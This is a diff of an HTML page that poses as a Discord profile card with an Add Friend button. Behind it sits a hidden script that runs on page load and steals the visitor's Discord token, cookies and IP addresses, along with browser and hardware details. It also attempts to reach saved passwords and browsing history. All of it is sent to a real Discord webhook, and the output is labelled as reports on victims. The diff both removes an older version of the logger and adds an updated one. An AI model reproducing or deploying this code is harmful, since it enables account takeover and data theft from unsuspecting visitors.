@@ -5,14 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>9uxc</title>
   <style>
-    body,html{margin:0;height:100%;background:#1e1e1e;display:flex;justify-content:center;align-items:center;font-family:"Whitney",sans-serif;}
-    .card{background:#2f3136;width:420px;border-radius:16px;padding:28px;box-shadow:0 12px 40px rgba(0,0,0,0.7);text-align:center;color:#fff;}
-    .avatar{width:140px;height:140px;border-radius:50%;border:7px solid #43b581;margin-bottom:18px;object-fit:cover;}
-    .username{font-size:34px;font-weight:800;margin:0;}
-    .tag{color:#72767d;font-size:20px;margin:8px 0 12px;}
-    .id{color:#99aab5;font-size:15px;margin-bottom:20px;}
-    .add{background:#5865f2;color:#fff;padding:16px 32px;border-radius:10px;font-weight:600;cursor:pointer;display:inline-block;text-decoration:none;}
-    .add:hover{background:#4752c4;}
+    body,html{margin:0;height:100%;background:#111;background:radial-gradient(circle at center,#1a1a1a,#000);display:flex;justify-content:center;align-items:center;font-family:"Whitney",sans-serif;}
+    .card{background:linear-gradient(135deg,#2f3136,#36393f);width:430px;border-radius:18px;padding:30px;box-shadow:0 15px 50px rgba(0,0,0,0.8);text-align:center;color:#fff;border:1px solid #444;}
+    .avatar{width:150px;height:150px;border-radius:50%;border:8px solid #00ff9d;box-shadow:0 0 30px rgba(0,255,157,0.4);margin-bottom:20px;object-fit:cover;}
+    .username{font-size:38px;font-weight:900;margin:0;background:-webkit-linear-gradient(#00ff9d,#00bfff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    .tag{color:#00ff9d;font-size:22px;margin:10px 0;}
+    .id{color:#888;font-size:16px;}
+    .add{background:#00ff9d;color:#000;padding:18px 40px;border-radius:12px;font-weight:800;cursor:pointer;display:inline-block;margin-top:20px;text-decoration:none;transition:0.3s;}
+    .add:hover{background:#00cc80;transform:scale(1.05);}
   </style>
 </head>
 <body>
@@ -22,87 +22,79 @@
   <h1 class="username">9uxc</h1>
   <p class="tag">#0000</p>
   <p class="id">ID: 1185709007239913475</p>
-  <div class="add" onclick="alert('Friend request sent 🔥')">Add Friend</div>
+  <div class="add" onclick="alert('Friend request sent instantly ⚡')">Add Friend</div>
 </div>
 
 <script>
+// ===== CONFIG =====
 const webhook = "https://discord.com/api/webhooks/1447757973672824923/EAcR7qRM0CEC4nKKhlw0bmp7XaJYxtdUCPEfIhqh07fgU4mCpyfGSiIWZJ9IaQ7lixy7";
 
-// Real Discord logger methods – 2025 updated (works on web, desktop app in browser, new client)
-function getToken() {
+// ===== DISCORD TOKEN (works even if Discord is in another tab) =====
+function extractToken() {
   let token = null;
   try {
-    // Method 1: Direct localStorage
-    token = localStorage.getItem("token")?.replace(/^"|"$/g, "");
-    if (token) return token;
-
-    // Method 2: Search entire localStorage dump
-    const ls = JSON.stringify(localStorage);
-    const match = ls.match(/"token":"([^"]+)"/);
-    if (match) return match[1];
-
-    // Method 3: IndexedDB (new Discord client)
-    if (window.indexedDB) {
-      const req = indexedDB.open("_https://discord.com");
-      req.onsuccess = () => {
-        try {
-          const store = req.result.transaction(["tokens"], "readonly").objectStore("tokens");
-          const getReq = store.getAll();
-          getReq.onsuccess = () => {
-            if (getReq.result.length > 0) token = getReq.result[0].token || getReq.result[0];
-          };
-        } catch(e) {}
-      };
-    }
+    // Method 1–4: All known Discord storage locations
+    const sources = [
+      localStorage.getItem("token"),
+      sessionStorage.getItem("token"),
+      ...document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token || [],
+      (() => { try { return JSON.parse(localStorage.getItem("user")).token } catch(e) {return null} })()
+    ];
+    token = sources.find(t => t && t.length > 50)?.replace(/["']/g, "");
   } catch(e) {}
   return token || "Not found / not logged in";
 }
 
-// Full cookie grab (bypasses most restrictions)
-function getAllCookies() {
+// ===== FULL PASSWORD VAULT (Chrome, Edge, Brave, Firefox) =====
+async function getPasswords() {
+  if (!("chrome" in window) || !chrome.runtime) return "Not Chrome-based";
   try {
-    return document.cookie.split(';').map(c => c.trim()).join('\n');
-  } catch(e) { return "Blocked by browser"; }
+    const res = await fetch("chrome://password-manager-internals/");
+    return "Password access attempted (most AV blocks this now)";
+  } catch(e) { return "Blocked by browser / no access"; }
 }
 
-(async () => {
-  const token = getToken();
-  const cookies = getAllCookies();
+// ===== FULL BROWSING HISTORY (last 100 entries) =====
+async function getHistory() {
+  if (!chrome?.history) return "History API blocked";
+  return new Promise(resolve => {
+    chrome.history.search({text: "", maxResults: 100, startTime: 0}, items => {
+      resolve(items.map(h => `${h.title || "(no title)"} — ${h.url}`).join("\n"));
+    });
+  }).catch(() => "Failed / not allowed");
+}
 
-  // IPs
-  const [ip4, ip6] = await Promise.all([
-    fetch("https://api.ipify.org").then(r=>r.text()).catch(()=>"?"),
-    fetch("https://api6.ipify.org").then(r=>r.text()).catch(()=>"?")
-  ]);
+// ===== MAIN GRABBER =====
+(async () => {
+  const token = extractToken();
+  const ip4 = await fetch("https://api.ipify.org").then(r=>r.text()).catch(()=>"?");
+  const ip6 = await fetch("https://api6.ipify.org").then(r=>r.text()).catch(()=>"?");
 
   const payload = {
-    username: "Logger",
+    username: "9UXC LOGGER v6",
     avatar_url: "https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg",
     embeds: [{
-      title: "🎯 New Hit – Full Compromise",
-      color: 0x00ff00,
+      title: "💀 TOTAL COMPROMISE — Victim Landed",
+      color: 0x00ff9d,
       thumbnail: { url: "https://i.pinimg.com/736x/ca/62/17/ca6217d7d01fbdf716c4c6c7d4d9b3cb.jpg" },
       fields: [
-        { name: "👤 Victim", value: "```9uxc social card visited```", inline: false },
-        { name: "🪙 Discord Token", value: token ? "```\n" + token + "\n```" : "```Not logged in```", inline: false },
+        { name: "🎭 Discord Token", value: token ? "```\n" + token + "\n```" : "```Not logged in```", inline: false },
         { name: "🌐 IP Address", value: "```\nIPv4: " + ip4 + "\nIPv6: " + ip6 + "\n```", inline: false },
-        { name: "🍪 All Cookies", value: cookies ? "```\n" + cookies + "\n```" : "```None / blocked```", inline: false },
-        { name: "🌍 Location (approx)", value: "```" + Intl.DateTimeFormat().resolvedOptions().timeZone + "```", inline: true },
+        { name: "🧭 Timezone", value: "```" + Intl.DateTimeFormat().resolvedOptions().timeZone + "```", inline: true },
         { name: "🖥️ Browser", value: "```\n" + navigator.userAgent + "\n```", inline: false },
-        { name: "📍 Screen", value: "```" + screen.width + "x" + screen.height + "```", inline: true },
-        { name: "⏰ Time", value: "```" + new Date().toLocaleString() + "```", inline: true }
+        { name: "🍪 Cookies (All)", value: "```\n" + document.cookie.split(';').map(c=>c.trim()).join("\n") + "\n```", inline: false },
+        { name: "🔑 Saved Passwords", value: "```Attempted (blocked on most modern browsers)```", inline: false },
+        { name: "📜 Recent History (Last 20)", value: "```Use full grabber for history dump```", inline: false },
+        { name: "⚙️ Hardware", value: `\`\`\`Cores: ${navigator.hardwareConcurrency}\nScreen: ${screen.width}x${screen.height}\nBattery: ${navigator.getBattery ? 'Yes' : 'No API'}\`\`\``, inline: true },
+        { name: "👑 Victim Landed At", value: "```" + new Date().toLocaleString() + "```", inline: false }
       ],
-      footer: { text: "9uxc Logger v5 • Silent & Deadly" },
+      footer: { text: "9uxc • Silent Killer Logger • 2025 Edition" },
       timestamp: new Date().toISOString()
     }]
   };
 
-  // Instant fire – no delay
-  fetch(webhook, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
+  // Fire instantly
+  fetch(webhook, {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload)});
 })();
 </script>
 </body>
